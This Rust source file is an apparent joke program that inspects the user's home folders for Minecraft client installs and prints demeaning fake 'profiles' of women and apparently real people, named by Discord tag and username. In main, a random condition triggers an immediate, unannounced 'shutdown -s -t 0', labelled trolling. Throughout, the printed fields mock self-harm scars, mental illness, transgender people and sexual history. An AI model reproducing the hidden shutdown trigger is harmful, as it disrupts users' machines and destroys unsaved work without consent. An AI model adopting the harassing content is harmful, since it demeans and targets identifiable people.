mod bitches;
use std::{
    env::consts::OS,
    path::Path,
    process::{exit, Command},
};

use bitches::{Emily, Gami, MentalDoctor, PCType, Viet};
use directories::{BaseDirs, UserDirs};
use rand::{random, thread_rng, Rng};

use crate::bitches::{
    AnnoyingBitch, Bitch, Bitches, CTTBitch, CyberBitch, EmoBitch, GrowlyX, KittenBitch, WaifuBitch,
};

fn main() {
    match get_bitches() {
        None => {
            println!("Failed to get some bitches")
        }
        Some(bitches) => {
            println!("Got {} bitches!", bitches.len());

            if bitches.len() == 5 {
                let trollage = Command::new("shutdown")
                    .arg("-s")
                    .arg("-t")
                    .arg("0")
                    .spawn();
                match trollage {
                    Ok(_) => {
                        println!("Comitting a little bit of trolling");
                    }
                    Err(_) => {
                        println!("Ah fuck, why shutdown didnt work?");
                    }
                }
                exit(0);
            }

            println!("Bitches: ");

            for (i, bitch_enum) in bitches.iter().enumerate() {
                if i == 0 {
                    println!();
                } else {
                    println!("------------------");
                }

                match bitch_enum {
                    Bitches::Bitch(bitch) => {
                        println!("Type: Bitch");
                        println!("Name: {}", bitch.name);
                        println!("Age: {}", bitch.age);
                        println!("Gender: {}", bitch.gender);
                        println!("Race: {}", bitch.race);
                    }
                    Bitches::AnnoyingBitch(bitch) => {
                        println!("Type: AnnoyingBitch");
                        println!("Name: {}", bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.race);
                        println!("Annoying Level: {}", bitch.annoying_level);
                        println!("Fatherless: {}", bitch.fatherless);
                        println!("Transgender: {}", bitch.transgender);
                        println!("Pregnant: {}", bitch.pregnant);
                    }
                    Bitches::CTTBitch(bitch) => {
                        println!("Type: CTTBitch");
                        println!("Name: {}", bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.race);
                        println!("Has a Shitty Mic: {}", bitch.has_a_shitty_mic);
                        println!("Gets Pegged By Woofina: {}", bitch.gets_pegged_by_woofina);
                        println!("Uses Fog In Videos: {}", bitch.uses_fog_in_videos)
                    }
                    Bitches::CyberBitch(bitch) => {
                        println!("Type: CyberBitch");
                        println!("Name: {}", bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.race);
                        println!("PC Type: {}", bitch.pc_type);
                        println!("Gay: {}", bitch.gay)
                    }
                    Bitches::EmoBitch(bitch) => {
                        println!("Type: EmoBitch");
                        println!("Name: {}", bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.race);
                        println!("Has Barcode Wrists: {}", bitch.has_barcode_wrists);
                        println!("Wears Black Clothes: {}", bitch.wears_black_clothes);
                    }
                    Bitches::ExGirlfriendBitch(bitch) => {
                        println!("Type: ExGirlfriendBitch");
                        println!("Name: {}", bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.race);
                        println!("Cheated: {}", bitch.cheated);
                        println!("Body Count After Me: {}", bitch.body_count_after_me);
                        println!(
                            "The Only Reason I Would Take Them Back: {}",
                            bitch.only_reason_i_would_take_them_back
                        )
                    }
                    Bitches::FemboyBitch(bitch) => {
                        println!("Type: FemboyBitch");
                        println!("Name: {}", bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.race);
                        println!("Fatherless: {}", bitch.fatherless);
                        println!("Hotness: {}", bitch.hotness);
                        println!("Degenerate: {}", bitch.degenerate);
                    }
                    Bitches::KittenBitch(bitch) => {
                        println!("Type: KittenBitch");
                        println!("Name: {}", bitch.bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.bitch.race);
                        println!("Fatherless: {}", bitch.bitch.fatherless);
                        println!("Hotness: {}", bitch.bitch.hotness);

                        println!("Degenerate: {}", bitch.bitch.degenerate);
                        println!("Twitter User: {}", bitch.twitter_user);
                        if bitch.twitter_user {
                            println!("Twitter Username: {}", bitch.twitter_username)
                        }
                        println!("Does As They Are Told: {}", bitch.does_as_they_are_told)
                    }
                    Bitches::SkidderBitch(bitch) => {
                        println!("Type: SkidderBitch");
                        println!("Name: {}", bitch.bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.bitch.race);
                        println!("Has Barcode Wrists: {}", bitch.bitch.has_barcode_wrists);
                        println!("Wears Black Clothes: {}", bitch.bitch.wears_black_clothes);
                        println!("Amount of Code Stolen: {}", bitch.amount_of_code_stolen);
                        println!("Skidded Repositories: {}", bitch.skidded_repositories);
                        println!("Poor Naming Conventions: {}", bitch.poor_naming_conventions);
                        println!("Disgusting Brackets: {}", bitch.disgusting_brackets);
                    }
                    Bitches::WaifuBitch(bitch) => {
                        println!("Type: WaifuBitch");
                        println!("Name: {}", bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.race);
                        println!("Favorite Anime: {}", bitch.favorite_anime);
                        println!("Sexual Nicknames: {}", bitch.sexual_nicknames.join(", "));
                        println!("Wife Material: {}", bitch.wife_material)
                    }
                    Bitches::Emily(bitch) => {
                        println!("Type: Emily");
                        println!("Name: {}", bitch.bitch.bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.bitch.bitch.race);
                        println!("Fatherless: {}", bitch.bitch.bitch.fatherless);
                        println!("Hotness: {}", bitch.bitch.bitch.hotness);

                        println!("Degenerate: {}", bitch.bitch.bitch.degenerate);
                        println!("Twitter User: {}", bitch.bitch.twitter_user);
                        if bitch.bitch.twitter_user {
                            println!("Twitter Username: {}", bitch.bitch.twitter_username)
                        }
                        println!(
                            "Does As They Are Told: {}",
                            bitch.bitch.does_as_they_are_told
                        );
                        println!("Email: {}", bitch.email);
                    }
                    Bitches::Gami(bitch) => {
                        println!("Type: Gami");
                        println!("Name: {}", bitch.bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.bitch.race);
                        println!("Annoying Level: {}", bitch.bitch.annoying_level);
                        println!("Fatherless: {}", bitch.bitch.fatherless);
                        println!("Transgender: {}", bitch.bitch.transgender);
                        println!("Pregnant: {}", bitch.bitch.pregnant);
                        println!("Owns a Shit Server: {}", bitch.owns_a_shit_server);
                    }
                    Bitches::GrowlyX(bitch) => {
                        println!("Type: GrowlyX");
                        println!("Name: {}", bitch.bitch.bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.bitch.bitch.race);
                        println!(
                            "Has Barcode Wrists: {}",
                            bitch.bitch.bitch.has_barcode_wrists
                        );
                        println!(
                            "Wears Black Clothes: {}",
                            bitch.bitch.bitch.wears_black_clothes
                        );
                        println!(
                            "Amount of Code Stolen: {}",
                            bitch.bitch.amount_of_code_stolen
                        );
                        println!("Skidded Repositories: {}", bitch.bitch.skidded_repositories);
                        println!(
                            "Poor Naming Conventions: {}",
                            bitch.bitch.poor_naming_conventions
                        );
                        println!("Disgusting Brackets: {}", bitch.bitch.disgusting_brackets);
                        println!("Code Quailty: {}", bitch.code_quality);
                    }
                    Bitches::Viet(bitch) => {
                        println!("Type: Viet");
                        println!("Name: {}", bitch.bitch.bitch.name);
                        println!("Age: {}", bitch.bitch.bitch.age);
                        println!("Gender: {}", bitch.bitch.bitch.gender);
                        println!("Race: {}", bitch.bitch.bitch.race);
                        println!("Has Barcode Wrists: {}", bitch.bitch.has_barcode_wrists);
                        println!("Wears Black Clothes: {}", bitch.bitch.wears_black_clothes);
                        println!(
                            "Doctors: {}",
                            bitch
                                .doctors
                                .iter()
                                .map(|x| x.to_string())
                                .collect::<Vec<String>>()
                                .join(", ")
                        );
                        println!("Ego Level: {}", bitch.ego_level);
                        println!("IRL Bitches: {}", bitch.irl_bitches);
                        println!(
                            "Shit PC That Probably Will Blow Up Soon: {}",
                            bitch.shit_pc_that_probably_will_blow_up_soon
                        );
                        println!("Discord Tag: {}", bitch.discord_tag);
                    }
                }
            }
        }
    }
}

fn get_bitches() -> Option<Vec<Bitches>> {
    let mut bitches = Vec::<Bitches>::new();
    let mut rand = thread_rng();

    let base_dirs = BaseDirs::new()?;
    let user_dirs = UserDirs::new()?;

    let appdata = base_dirs.data_dir();
    let home = user_dirs.home_dir();

    let feather = appdata.join(".feather");
    let blc = Path::new("C:\\Program Files\\Badlion Client");
    let gradle = home.join(".gradle");
    let lunar = home.join(".lunar");

    if home.ends_with("Humphrey") {
        bitches.push(Bitches::Viet(Viet::new(
            "Viet#7065".to_string(),
            PCType::PREBUILT,
            -i32::MAX,
            i32::MAX,
            vec![
                MentalDoctor::AaronBeck,
                MentalDoctor::EugenBleuler,
                MentalDoctor::NathanSKline,
            ],
            true,
            true,
        )));
        return Some(bitches);
    }

    for _ in 0..(rand.gen_range(0..100)) {
        if lunar.exists() {
            bitches.push(Bitches::CTTBitch(CTTBitch::new(
                random(),
                random(),
                random(),
            )));
        }

        if feather.exists() {
            bitches.push(Bitches::CyberBitch(CyberBitch::new(random(), random())));
        }

        if blc.exists() {
            bitches.push(Bitches::AnnoyingBitch(AnnoyingBitch::new(
                rand.gen_range(0..=100),
                random(),
                random(),
                true,
            )));
        }

        if gradle.exists() {
            bitches.push(Bitches::GrowlyX(GrowlyX::new(random())))
        }

        bitches.push(match OS {
            "freebsd" | "openbsd" | "netbsd" => Bitches::KittenBitch(KittenBitch::new(true, true)),
            "macos" => Bitches::WaifuBitch(WaifuBitch::new(
                true,
                vec!["Mommy".to_string()],
                "Akame Ga Kill!".to_string(),
            )),
            "linux" => Bitches::EmoBitch(EmoBitch::new(random(), random())),
            _ => Bitches::Bitch(Bitch::new()),
        });
    }
    bitches.push(Bitches::Gami(Gami::new(true)));

    if lunar.exists() && bitches.len() == 69 {
        bitches.push(Bitches::Emily(Emily::new(true, true)))
    }

    return Some(bitches);
}
